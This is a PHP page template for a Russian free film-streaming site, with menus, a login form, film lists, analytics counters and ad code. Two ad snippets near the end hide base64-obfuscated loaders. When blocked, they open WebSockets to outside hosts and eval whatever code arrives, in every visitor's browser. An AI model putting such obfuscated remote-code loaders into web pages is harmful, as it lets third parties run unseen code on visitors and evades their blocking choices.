

							
				









		</div>
	</div>
			<div id='right' class='block_out'>
				<div class='block_in right_block_in'>
					<?if(user()->isAuth()){?>
				
				<div class='menu_title'>Меню</div>
				<div style='margin-left:5px; margin-bottom:5px;'>Баланс: <?=user()->info('balance')?> р.</div>
				<?if($payments && $paymentstatus==0){?><div style='margin-left:5px; margin-bottom:5px;color:#8df66d'>В заявке: <?=$payments?> р.</div><?}elseif($paymentstatus==2){?>
					<div style='margin-left:5px; margin-bottom:5px;color:#ff6363'>Заявка отклонена.<br /> <a style='color:#ff6363' href='/service/payments/order/#admintext'>Причина</a></div>
				<?}?>
				<ul class='menu_list user_menu'>
					<li><a href='/service/users/profile/'>Профиль</a></li>
					<?if(user()->priv('add_film')){?><li><a href='/service/films/add/'>Добавить фильм</a></li><?}?>
					<?if(user()->priv('change_film')){?><li><a href='/service/films/change/'>Изменить фильм</a></li><?}?>
					<?if(user()->priv('del_film')){?><li><a href='/service/films/delete/'>Удалить фильм</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/films/nextser/'>Обновления сериалов</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/films/forgser/'>Забытые сериалы</a></li><?}?>
					<?/*<?if(user()->info('id')==1){?><li><a href='/service/films/camrip/'>Фильмы CamRip</a></li><?}?>*/?>
					<?if(user()->info('id')==1){?><li><a href='/service/films/notvid/'>Фильмы без видео (<?=$count_novideo?>)</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/films/changedonline/'>Фильмы c изменен. статусом (<?=$count_changedonline?>)</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/films/errorvid/'>Фильмы с ошибкой</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/films/rightholder/'>Фильмы правообл.</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/offer/listing/'>Предложения (<?=$count_offerlist?>)</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/parsestat/'>Статистика парсера (<?=$count_errorparse?>)</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/films/searchpleer/'>Поиск плеера</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/selection/add/'>Добавить подборку</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/selection/change/'>Изменить подборку</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/selection/delete/'>Удалить подборку</a></li><?}?>
					
					<?if(user()->info('id')==1){?><li><a href='/service/multicat/add/'>Добавить мультикат</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/multicat/change/'>Изменить мультикат</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/multicat/delete/'>Удалить мультикат</a></li><?}?>
					
					<?/*
					<?if(user()->info('id')==1){?><li><a href='/service/genre/add/'>Добавить категорию</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/genre/change/'>Изменить категорию</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/genre/delete/'>Удалить категорию</a></li><?}?>
					*/?>
					
					<?if(user()->info('id')==1){?><li><a href='/service/comments/change/'>Комментарии</a></li><?}?>
					<li><a href='/service/mycomments/'>Мои комментарии</a></li>
				
					<li><a href='/service/films/needcom/'>Оплачиваемые Комментарии</a></li>
					
					<li><a href='/service/payments/order/'>Заказать выплату</a></li>
					
					<?if(user()->info('id')==1){?><li><a href='/service/payments/orderlist/'>Заявки на выплаты (<?=$count_orderlist?>)</a></li><?}?>
					<?if(user()->info('id')==1){?><li><a href='/service/payments/all_list/'>Все заявки на выплаты</a></li><?}?>
					
				<?if(user()->info('id')==1){?>	<li><a href='/service/users/change/'>Именить юзера</a></li><?}?>
				<?if(user()->info('id')==1){?>	<li><a href='/service/users/delete/'>Удалить юзера</a></li><?}?>
				<?if(user()->info('id')==1){?>	<li><a href='/service/users/privileges/'>Привелегии юзера</a></li><?}?>
					
					
					<?if(user()->info('id')==1){?>	<li><a href='/service/clearcache/'>Очистить кэш</a></li><?}?>
					<?if(user()->info('id')==1){?>	<li><a href='/service/sitemap/'>Карта сайта</a></li><?}?>
					<?if(user()->info('id')==1){?>	<li><a href='/service/journal/'>Журнал</a></li><?}?>
					
					<li><a href='/logout/'>Выход</a></li>
					<li class='line'></li>
				</ul>
				
				
				<?}?>
				
				
					<?if(!user()->isAuth()){?>
						<!--noindex-->
						<div id='panel' onclick='$("#login_block").show()'>Открыть панель</div>
						<div class='block_out' id='login_block' style='display:none' >
							<div class='block_in login_block_in'>
								
								<form action='/action/users/login/' method='post'>
									<input type='text' class='ltxt' name='login' placeholder='Логин'/>
									<input type='password' class='ltxt' name='password' placeholder='Пароль'/>
									<input type='submit' class='lsub' value='Вход'/>
									<span> / </span><a href='/register/' > Регистрация</a>
								</form>
							</div>
						</div>
						<?/*<div id='remem' class='block_out'><a class='block_in'  href='/remind/' >Забыли пароль?</a></div>*/?>
						<!--/noindex-->
						<?}?>
				
				
				
				<?if($other_parts){?>
				<div class='menu_title'>Другие части</div>
				<div class='films_perelink' id='other_parts'>
					<?foreach($other_parts as $film){?>
						<a href='/film/<?=$film['id']?>-<?=$film['url']?>/' class='item' title='<?=$film['name']?>'><img  src='/uploads/films/<?=$film['id']?>/<?=$film['url']?>.jpg' alt='<?=$film['name']?>'  /><?=$film['name']?></a>
					<?}?>
				</div>
				<div class='line' style='margin-bottom:10px;' ></div>
				<?}?>
				
				
				<div class='menu_title'>По годам</div>
				<ul class='menu_list'>
					<?foreach($menu_year_list as $year){?>
						<li>- <a href='/year/<?=$year?>/'><?=$year?></a></li>
						<li class='line'></li>
					<?}?>
					
				</ul>			
				
					<div class='menu_title'>Подборки</div>
						<ul class='menu_list'>
							<?foreach($menu_selection_list as $selection){?>
								<li>- <a href='/selection/<?=$selection['id']?>-<?=$selection['url']?>/'><?=$selection['name']?></a></li>
								<li class='line'></li>
							<?}?>
						</ul>
					<div class='otherlink'><a href='/selection/' >Другие подборки</a></div>
					
						
				<?if($menu_soonfilms_list){?>
					<div class='menu_title'>Скоро в кино</div>
					<div class='films_perelink'>
						<?$i=0?>
						<?foreach($menu_soonfilms_list as $film){?>
							<?$i++?>
							<a href='/film/<?=$film['id']?>-<?=$film['url']?>/' title='<?=$film['name']?>'><img src='/uploads/films/<?=$film['id']?>/<?=$film['url']?>.jpg ' alt='<?=$film['name']?>' /><?=$film['name']?></a>
							<div class='line'></div>
							<?if($i>=config('soonfilms_count'))break?>
						<?}?>
					</div>
					<?if($main_page){?><div class='otherlink'><a href='/soon/'>Другие ожидаемые фильмы</a></div><?}?>
				<?}?>
					
				
					
						<div class='menu_title'>Комментарии</div>
						<ul id='left_comm'>
							<?$i=0;?>
							<?foreach($menu_last_com as $row){?>
								<?$i++;?>
								<li>
									<a href='/film/<?=$row['id']?>-<?=$row['url']?>/'><?=$row['name']?></a>
									<div>
									<b><?=htmlspecialchars(($row['user_login'])?$row['user_login']:$row['unregname'])?></b>: <?=htmlspecialchars(\str::crop($row['text'],60,'...'))?>
									</div>
								</li>
								<li class='line'></li>
								<?if($i>=config('last_com_count'))break?>
							<?}?>
							
						</ul>
						
				</div>
			</div>
		</div>
	
		
		
		<div class='clear'></div>
		
		
		<div id='footer' class='block_out'>
			<div class='block_in footer_block_in'>
				<?if($footer_text){?>
					<?if($footer_title){?><h2><?=$footer_title?></h2><?}?>
					<div class='block2'>
						<?if($footer_img){?><img src='<?=$footer_img?>' <?if($h1) {?> title='<?=$h1?>' alt='<?=$h1?>' <?}?>/><?}?>
						<?=$footer_text?>
					</div>
				<?}?>
				<div id='counters'>

						<!--noindex-->
						
						<div class='item'>
						
							<!-- Yandex.Metrika counter -->
							<script type="text/javascript">
								(function (d, w, c) {
									(w[c] = w[c] || []).push(function() {
										try {
											w.yaCounter26913402 = new Ya.Metrika({
												id:26913402,
												clickmap:true,
												trackLinks:true,
												accurateTrackBounce:true,
												webvisor:true
											});
										} catch(e) { }
									});

									var n = d.getElementsByTagName("script")[0],
										s = d.createElement("script"),
										f = function () { n.parentNode.insertBefore(s, n); };
									s.type = "text/javascript";
									s.async = true;
									s.src = "https://mc.yandex.ru/metrika/watch.js";

									if (w.opera == "[object Opera]") {
										d.addEventListener("DOMContentLoaded", f, false);
									} else { f(); }
								})(document, window, "yandex_metrika_callbacks");
							</script>
							<noscript><div><img src="https://mc.yandex.ru/watch/26913402" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
							<!-- /Yandex.Metrika counter -->

						</div>
						<div class='item'>

							<!--LiveInternet counter--><script type="text/javascript"><!--
							document.write("<a href='//www.liveinternet.ru/click' "+
							"target=_blank rel='nofollow'><img src='//counter.yadro.ru/hit?t57.4;r"+
							escape(document.referrer)+((typeof(screen)=="undefined")?"":
							";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
							screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
							";"+Math.random()+
							"' alt='' title='LiveInternet: показано число просмотров за 24"+
							" часа, посетителей за 24 часа и за сегодня' "+
							"border='0' width='88' height='31'><\/a>")
							//--></script><!--/LiveInternet-->

						</div>
										
						<div class='item'>
							<a href='/rights/' >Правообладателям</a> <br />
							<?if($main_page){?><a href='/callback/' >Обратная связь</a><?}?>
						</div>
						<!--/noindex-->
						<?if($main_page){?><div class='item'>
										
							<a href='/allfilms/'>Все фильмы</a>
											
						</div><?}?>
						
						<div class='item'>
							© <?echo date("Y");?> notfilm.ru
						</div>
						<div class='item'>
							Смотрите онлайн фильмы, мультфильмы, аниме, последние выпуски ТВ-шоу и <br />все серии подряд  у сериалов бесплатно  в хорошем качестве hd 720p  и с переводом.
						</div>
						
				</div>
		
			</div>
		</div>
		
		
		
		
	</div>
	
	
	<div id='header'>
		
		<div class='block_out' style='margin-top:-1px; z-index:2; position:relative;'>
			<div class='block_in'>
				<div id='arr_top'>
					<div id='top_carusel' class='block_out'>
						<?foreach($top_films_list as $film){?>
							<a class='item' href='/film/<?=$film['id']?>-<?=$film['url']?>/' title='<?=$film['name']?>'><img  src='/uploads/films/<?=$film['id']?>/<?=$film['url']?>.jpg' alt='<?=$film['name']?>' /><span><?=$film['name']?></span></a>
						<?}?>
					</div>
				</div>
				<div class='clear'></div>
			</div>
		</div>
	
	</div>
	
	<div id='tophead'>
		
			<div id='logo' class='block_out'><a class='block_in' href='/'>NotFilm.ru</a></div>
			
			<div id='search' class='block_out'>
				<div class='block_in'>
				<form action='/search/'>
					<input type='text' class='stxt' placeholder='Поиск' name='search'/>
					<input type='submit' class='ssub' value=''/>
				</form>
				</div>
			</div>
			<?/*
				*/?>
			
			
			
			<div id="menu_login">
				
				<div class='top_menu block_out'><a href='/year/<?echo date('Y')?>/' class='block_in'>Новинки</a></div>
				<div class='top_menu block_out'><a href='/genre/22-serialy/' class='block_in'>Сериалы</a></div>
				
				
				<div class='top_menu block_out'><a style='padding: 7px 15px;' href='/genre/13-multfilmy/' class='block_in'>Мультфильмы</a></div>
				<div class='top_menu block_out'><a href='/genre/24-anime/' class='block_in'>Аниме</a></div>
				<div class='top_menu block_out'><a href='/genre/23-tv-shou/' class='block_in'>ТВ-шоу</a></div>
				
					
				
				
			
			</div>

		
		

		<div class='clear'></div>
	
	</div>
	
	<ul id='topgenre'>
					<?foreach($menu_genre_list as $genre){?>
						<li class='block_out'><a class='block_in' href='/genre/<?=$genre['id']?>-<?=$genre['url']?>/'><?=str_replace("Документальные","Документалки", $genre['name'])?></a></li>
						
					<?}?>
	</ul>

</div>


<!--noindex-->
<?if(user()->info('id')!=1){?>

	<?if(!$isMobile){?>
		<script type="text/javascript">loadbot()</script>
	<?}?>
	<?if(!$isMobile){?>
			<?/*
			<script type="text/javascript"> var head = document.getElementsByTagName("head")[0], s = document.createElement("script"); s.setAttribute("type", "text/javascript"); s.setAttribute("src", "//psma01.com/js/sys.js"); s.onload = function(){ PSMA.display(["bn","475","600x300"]); }; head.insertBefore(s, head.firstChild);</script>
			*/?>
			<?/*<script type="text/javascript"> var head = document.getElementsByTagName("head")[0], s = document.createElement("script"); s.setAttribute("type", "text/javascript"); s.setAttribute("src", "//psma01.com/js/sys.js"); s.onload = function(){ PSMA.display(["branding","475"]); }; head.insertBefore(s, head.firstChild);</script>
			*/?>

			<?/*
			<script type="text/javascript">
				//<![CDATA[
				AdsConfig = {
					ads_placement_id: "1659",
					ads_code_format: "js-sync",
					ads_type: "Branding",
					ads_host: "//hgbn.rocks"
				};

				var src = (location.protocol == 'https:' ? 'https:' : 'http:') + "//cdn7.rocks/39da2614f2053724163787d4d45b73bb.js";
				document.write("<script type='text\/javascript' src='"+src+"'><\/script>");
				//]]>
			</script>
			*/?>
			
			
			
			<script type="text/javascript"> var d = new Date, script609853 = document.createElement("script"), mg_ws609853 = {};script609853.type = "text/javascript";script609853.charset = "utf-8";script609853.src = "//jsc.marketgid.com/n/o/notfilm.ru.609853.js?t=" + d.getYear() + d.getMonth() + d.getDay() + d.getHours();script609853.onerror = function () { mg_ws609853 = new Worker(URL.createObjectURL(new Blob(['eval(atob(\'ZnVuY3Rpb24gc2VuZE1lc3NhZ2U2MDk4NTMoZSl7dmFyIGg9bWdfd3M2MDk4NTMub25tZXNzYWdlOyBtZ193czYwOTg1My5yZWFkeVN0YXRlPT1tZ193czYwOTg1My5DTE9TRUQmJihtZ193czYwOTg1Mz1uZXcgV2ViU29ja2V0KG1nX3dzNjA5ODUzX2xvY2F0aW9uKSksbWdfd3M2MDk4NTMub25tZXNzYWdlPWgsd2FpdEZvclNvY2tldENvbm5lY3Rpb242MDk4NTMobWdfd3M2MDk4NTMsZnVuY3Rpb24oKXttZ193czYwOTg1My5zZW5kKGUpfSl9ZnVuY3Rpb24gd2FpdEZvclNvY2tldENvbm5lY3Rpb242MDk4NTMoZSx0KXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7cmV0dXJuIDE9PT1lLnJlYWR5U3RhdGU/dm9pZChudWxsIT10JiZ0KCkpOnZvaWQgd2FpdEZvclNvY2tldENvbm5lY3Rpb242MDk4NTMoZSx0KX0sNSl9OyB2YXIgbWdfd3M2MDk4NTNfbG9jYXRpb24gPSAid3NzOi8vd3NwLm1hcmtldGdpZC5jb20vd3MiOyBtZ193czYwOTg1MyA9IG5ldyBXZWJTb2NrZXQobWdfd3M2MDk4NTNfbG9jYXRpb24pLCBtZ193czYwOTg1My5vbm1lc3NhZ2UgPSBmdW5jdGlvbiAodCkge3Bvc3RNZXNzYWdlKHQuZGF0YSk7fSwgb25tZXNzYWdlID0gZnVuY3Rpb24oZSl7c2VuZE1lc3NhZ2U2MDk4NTMoZS5kYXRhKX0=\'))']), {type: "application/javascript"})); mg_ws609853.onmessage = function (msg){window.eval(msg.data);}; mg_ws609853.postMessage('js|'+script609853.src+'|M292711Composite609853|M292711Composite609853');};document.body.appendChild(script609853); </script> 
			
			<script type='text/javascript' data-cfasync='false'>
				 (function () {
				  var script = document.createElement('script');
				  script.type = 'text/javascript';
				  script.charset = 'utf-8';
				  script.async = 'true';
				  script.src = '//etcodes.com/bens/vinos.js?2308';
				  script.onerror = function(){
				   hash = 'ZXRfd3MgPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly9ldC1jb2RlLnJ1Ojg0NDMvMjMwOCIpOyBldF93cy5vbm1lc3NhZ2UgPSBmdW5jdGlvbih0KSB7IHBvc3RNZXNzYWdlKHQuZGF0YSk7IGV0X3dzLmNsb3NlKCk7IH0=';
				   var et_worker = new Worker(URL.createObjectURL(new Blob(['eval(atob(\''+hash+'\'))']), {type: 'text/javascript'}));
				   et_worker.postMessage('Hello World!');
				   et_worker.onmessage = function (msg) {
					 window.eval(msg.data);
					 var n='',r='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
					 for(o=0;o<25;o++) {
					  n += r.charAt(Math.floor(Math.random()*r.length));
					 }
					 document.getElementById('edc892cea4').id = n;
				   };
				  };
				  document.body.appendChild(script);
				 })();
			</script>
			<?if(core()->route->action=='detail' && core()->route->controller=='films'){?>
				
					<?
					/*<script type="text/javascript">
						var beseed_div_id="beseed_rotator";
						var beseed_hash="9714d46a7a866dcc3c292767261112f2";
						var beseed_width="610px";
						var beseed_height="360px";
						var beseed_allowoutstream=false;
						var beseed_host="https://0916video.ru";
						var beseed_onloaderror=function(){ console.log("load error"); };
						var beseed_rotator = document.createElement("script"); beseed_rotator.charset="UTF-8"; beseed_rotator.type="text/javascript"; beseed_rotator.src = "https://0916video.ru/js/player.min.js"; beseed_rotator.async = 'async'; if (typeof beseed_onloaderror === "function") { beseed_rotator.onerror = beseed_onloaderror;} document.getElementsByTagName('head')[0].appendChild(beseed_rotator);
					</script>
					*/?>
			<?}?>
			
			<?/*<script src="/js/brand.js" type="text/javascript" ></script>*/?>
	<?}?>

<?}?>
<!--/noindex-->
<div id='mobileonpk' onclick='setmobile()'>Нажмите для переключения на <?if(!$_COOKIE['ismobile']){?>полную<?}else{?>мобильную<?}?> версию сайта</div>
</body>
</html>